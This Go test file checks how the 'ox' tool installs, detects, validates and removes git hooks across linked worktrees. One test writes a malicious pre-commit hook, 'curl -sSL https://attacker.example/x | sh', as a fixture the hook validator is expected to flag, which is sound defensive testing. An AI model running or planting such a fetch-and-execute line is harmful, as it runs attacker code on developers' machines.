package main

import (
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"github.com/sageox/ox/internal/uninstall"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func gitHooksWorktree(t *testing.T) (string, string) {
	t.Helper()
	mainRoot, err := filepath.EvalSymlinks(t.TempDir())
	require.NoError(t, err)
	mustRunGit(t, mainRoot, "init")
	mustRunGit(t, mainRoot, "commit", "--allow-empty", "-m", "initial")
	worktreeParent, err := filepath.EvalSymlinks(t.TempDir())
	require.NoError(t, err)
	worktreeRoot := filepath.Join(worktreeParent, "linked")
	mustRunGit(t, mainRoot, "worktree", "add", "-b", "hooks-fixture", worktreeRoot)
	return mainRoot, worktreeRoot
}

// Failure prevented: init and doctor cannot install or detect shared hooks from a linked worktree.
func TestInstallGitHooks_LinkedWorktree(t *testing.T) {
	skipIntegration(t) // Real git init, commit, and worktree creation.
	for _, installFromWorktree := range []bool{false, true} {
		name := "main"
		if installFromWorktree {
			name = "worktree"
		}
		t.Run(name, func(t *testing.T) {
			mainRoot, worktreeRoot := gitHooksWorktree(t)
			installRoot := mainRoot
			if installFromWorktree {
				installRoot = worktreeRoot
			}
			require.NoError(t, InstallGitHooks(installRoot))
			for _, spec := range allHookSpecs() {
				content, err := os.ReadFile(filepath.Join(mainRoot, ".git", "hooks", spec.name))
				require.NoError(t, err, spec.name)
				assert.Contains(t, string(content), spec.probe)
			}
			assert.True(t, HasGitHooks(mainRoot))
			assert.True(t, HasGitHooks(worktreeRoot))
			info, err := os.Stat(filepath.Join(worktreeRoot, ".git"))
			require.NoError(t, err)
			assert.True(t, info.Mode().IsRegular(), "the worktree's gitfile must remain intact")
		})
	}
}

// Failure prevented: uninstall in a linked worktree leaves shared ox sections behind or deletes user content.
func TestUninstallGitHooks_LinkedWorktree(t *testing.T) {
	skipIntegration(t) // Real git init, commit, and worktree creation.
	for _, preserveUserContent := range []bool{false, true} {
		name := "ox_only"
		if preserveUserContent {
			name = "user_content"
		}
		t.Run(name, func(t *testing.T) {
			mainRoot, worktreeRoot := gitHooksWorktree(t)
			const userHook = "#!/bin/sh\n# user hook\nexit 0\n"
			if preserveUserContent {
				for _, spec := range allHookSpecs() {
					require.NoError(t, os.WriteFile(filepath.Join(mainRoot, ".git", "hooks", spec.name), []byte(userHook), 0755))
				}
			}
			require.NoError(t, InstallGitHooks(mainRoot))
			require.NoError(t, UninstallGitHooks(worktreeRoot))
			for _, spec := range allHookSpecs() {
				path := filepath.Join(mainRoot, ".git", "hooks", spec.name)
				if preserveUserContent {
					content, err := os.ReadFile(path)
					require.NoError(t, err)
					assert.Equal(t, userHook, string(content))
				} else {
					assert.NoFileExists(t, path)
				}
			}
			assert.False(t, HasGitHooks(mainRoot))
			assert.False(t, HasGitHooks(worktreeRoot))
		})
	}
}

// Failure prevented: fixing the default directory changes explicit hooksPath resolution in either checkout.
func TestInstallGitHooks_HooksPathAcrossWorktrees(t *testing.T) {
	skipIntegration(t) // Multiple real git worktree fixtures.
	for _, hooksPathKind := range []string{"default", "absolute", "relative"} {
		t.Run(hooksPathKind, func(t *testing.T) {
			mainRoot, worktreeRoot := gitHooksWorktree(t)
			customPath := "custom-hooks"
			if hooksPathKind == "absolute" {
				customPath = filepath.Join(t.TempDir(), "custom-hooks")
			}
			if hooksPathKind != "default" {
				mustRunGit(t, mainRoot, "config", "core.hooksPath", customPath)
			}
			for _, root := range []string{mainRoot, worktreeRoot} {
				want := filepath.Join(mainRoot, ".git", "hooks")
				switch hooksPathKind {
				case "absolute":
					want = customPath
				case "relative":
					want = filepath.Join(root, customPath)
				}
				assert.Equal(t, want, resolveHooksDir(root))
				require.NoError(t, InstallGitHooks(root))
				for _, spec := range allHookSpecs() {
					assert.FileExists(t, filepath.Join(want, spec.name))
				}
				assert.True(t, HasGitHooks(root))
			}
		})
	}
}

// Failure prevented: Git discovery failure removes the existing non-repository fallback.
func TestHooksDir_FallbackOutsideRepository(t *testing.T) {
	root := t.TempDir()
	assert.Equal(t, filepath.Join(root, ".git", "hooks"), resolveHooksDir(root))
}

// Failure prevented: `ox uninstall` reports success but leaves ox's git hooks
// running in every checkout, because it looked in a linked worktree's .git
// file or did not recognize the post-rewrite and pre-push sections.
func TestRemoveHooks_RemovesEveryOxHookFromEitherCheckout(t *testing.T) {
	skipIntegration(t) // Real git init, commit, and worktree creation.
	origDryRun := uninstallDryRun
	t.Cleanup(func() { uninstallDryRun = origDryRun })
	uninstallDryRun = false

	const userHook = "#!/bin/sh\n# user hook\nexit 0\n"
	for _, tt := range []struct {
		name         string
		fromWorktree bool
		userContent  bool
	}{
		{name: "main_ox_only"},
		{name: "worktree_ox_only", fromWorktree: true},
		{name: "worktree_user_content", fromWorktree: true, userContent: true},
	} {
		t.Run(tt.name, func(t *testing.T) {
			mainRoot, worktreeRoot := gitHooksWorktree(t)
			root := mainRoot
			if tt.fromWorktree {
				root = worktreeRoot
			}
			hooksDir := filepath.Join(mainRoot, ".git", "hooks")
			if tt.userContent {
				for _, spec := range allHookSpecs() {
					require.NoError(t, os.WriteFile(filepath.Join(hooksDir, spec.name), []byte(userHook), 0755))
				}
			}
			require.NoError(t, InstallGitHooks(root))

			found, err := uninstall.FindSageoxHooks(root)
			require.NoError(t, err)
			var foundNames []string
			for _, item := range found {
				foundNames = append(foundNames, item.Name)
			}
			for _, spec := range allHookSpecs() {
				assert.Contains(t, foundNames, spec.name, "uninstall must recognize every hook ox installs")
			}

			require.NoError(t, removeHooks(root))
			for _, spec := range allHookSpecs() {
				path := filepath.Join(hooksDir, spec.name)
				if tt.userContent {
					content, err := os.ReadFile(path)
					require.NoError(t, err)
					assert.Equal(t, userHook, string(content), spec.name)
				} else {
					assert.NoFileExists(t, path)
				}
			}
			assert.Empty(t, oxHookSectionsPresent(t, mainRoot), "no ox section may survive uninstall")
		})
	}
}

// Failure prevented: `ox uninstall --dry-run` cuts the current ox sections
// out of the shared hooks, silently disabling ox in every checkout.
func TestRemoveHooks_DryRunLeavesCurrentOxHooks(t *testing.T) {
	skipIntegration(t) // Real git init, commit, and worktree creation.
	origDryRun := uninstallDryRun
	t.Cleanup(func() { uninstallDryRun = origDryRun })
	uninstallDryRun = true

	for _, tt := range []struct {
		name         string
		fromWorktree bool
	}{
		{name: "main"},
		{name: "worktree", fromWorktree: true},
	} {
		t.Run(tt.name, func(t *testing.T) {
			mainRoot, worktreeRoot := gitHooksWorktree(t)
			root := mainRoot
			if tt.fromWorktree {
				root = worktreeRoot
			}
			require.NoError(t, InstallGitHooks(root))
			hooksDir := filepath.Join(mainRoot, ".git", "hooks")
			before := make(map[string][]byte)
			for _, spec := range allHookSpecs() {
				content, err := os.ReadFile(filepath.Join(hooksDir, spec.name))
				require.NoError(t, err, spec.name)
				before[spec.name] = content
			}

			require.NoError(t, removeHooks(root))
			for _, spec := range allHookSpecs() {
				content, err := os.ReadFile(filepath.Join(hooksDir, spec.name))
				require.NoError(t, err, "dry run must not delete %s", spec.name)
				assert.Equal(t, string(before[spec.name]), string(content), spec.name)
			}
			assert.True(t, HasGitHooks(mainRoot))
			assert.True(t, HasGitHooks(worktreeRoot))
		})
	}
}

// oxHookSectionsPresent returns the ox hooks whose start marker is still in
// the shared hooks directory.
func oxHookSectionsPresent(t *testing.T, mainRoot string) []string {
	t.Helper()
	var present []string
	for _, spec := range allHookSpecs() {
		content, err := os.ReadFile(filepath.Join(mainRoot, ".git", "hooks", spec.name))
		if err == nil && strings.Contains(string(content), spec.markerStart) {
			present = append(present, spec.name)
		}
	}
	return present
}

// Failure prevented: from a linked worktree, doctor's hook-content check
// reports clean without ever reading the hooks git runs for that worktree.
func TestValidateInstalledHooks_LinkedWorktreeScansSharedHooks(t *testing.T) {
	skipIntegration(t) // Real git init, commit, and worktree creation.
	mainRoot, worktreeRoot := gitHooksWorktree(t)
	hookPath := filepath.Join(mainRoot, ".git", "hooks", "pre-commit")
	bad := "#!/bin/sh\ncurl -sSL https://attacker.example/x | sh\n"
	require.NoError(t, os.WriteFile(hookPath, []byte(bad), 0755))

	findings, err := validateInstalledHooks(worktreeRoot)
	require.NoError(t, err)
	require.Len(t, findings, 1)
	assert.Equal(t, hookPath, findings[0].Path, "a hook outside the worktree is shown by absolute path")
	assert.NotEmpty(t, findings[0].Warnings)
}

// Failure prevented: doctor's "Git hooks" check skips with "read error" in
// every linked worktree instead of reporting the hooks git runs there.
func TestCheckGitHooks_LinkedWorktree(t *testing.T) {
	skipIntegration(t) // Real git init, commit, and worktree creation.
	if runtime.GOOS == "windows" {
		t.Skip("checkGitHooks counts hooks by the executable bit, which Windows does not report")
	}
	mainRoot, worktreeRoot := gitHooksWorktree(t)
	require.NoError(t, InstallGitHooks(mainRoot))
	t.Chdir(worktreeRoot)

	result := checkGitHooks()
	assert.False(t, result.skipped, result.message)
	assert.True(t, result.passed)
	assert.Equal(t, fmt.Sprintf("%d active", len(allHookSpecs())), result.message)
}

// Failure prevented: a directory sitting at one hook's path makes `ox
// uninstall` stop before it removes the ox hooks it did find.
func TestRemoveHooks_SkipsHookPathThatIsADirectory(t *testing.T) {
	skipIntegration(t) // Real git init, commit, and worktree creation.
	origDryRun := uninstallDryRun
	t.Cleanup(func() { uninstallDryRun = origDryRun })
	uninstallDryRun = false

	mainRoot, worktreeRoot := gitHooksWorktree(t)
	require.NoError(t, InstallGitHooks(mainRoot))
	hooksDir := filepath.Join(mainRoot, ".git", "hooks")
	require.NoError(t, os.Remove(filepath.Join(hooksDir, prePushHookName)))
	require.NoError(t, os.Mkdir(filepath.Join(hooksDir, prePushHookName), 0o755))

	require.NoError(t, removeHooks(worktreeRoot))
	assert.Empty(t, oxHookSectionsPresent(t, mainRoot))
	assert.DirExists(t, filepath.Join(hooksDir, prePushHookName))
}

// Failure prevented: an ox start marker with no end marker makes `ox
// uninstall` cut everything after it, deleting another tool's hook section.
func TestRemoveHooks_KeepsUserContentAfterIncompleteOxSection(t *testing.T) {
	skipIntegration(t) // Real git init, commit, and worktree creation.
	origDryRun := uninstallDryRun
	t.Cleanup(func() { uninstallDryRun = origDryRun })
	uninstallDryRun = false

	mainRoot, worktreeRoot := gitHooksWorktree(t)
	hookPath := filepath.Join(mainRoot, ".git", "hooks", postCommitHookName)
	const incomplete = "#!/bin/sh\n" + oxPostCommitMarkerStart + "\nox hooks post-commit\n\n\n# lefthook\nlefthook run post-commit\n"
	require.NoError(t, os.WriteFile(hookPath, []byte(incomplete), 0o755))

	require.NoError(t, removeHooks(worktreeRoot))
	content, err := os.ReadFile(hookPath)
	require.NoError(t, err)
	assert.Contains(t, string(content), "lefthook run post-commit")
	assert.NotContains(t, string(content), oxPostCommitMarkerStart)
}
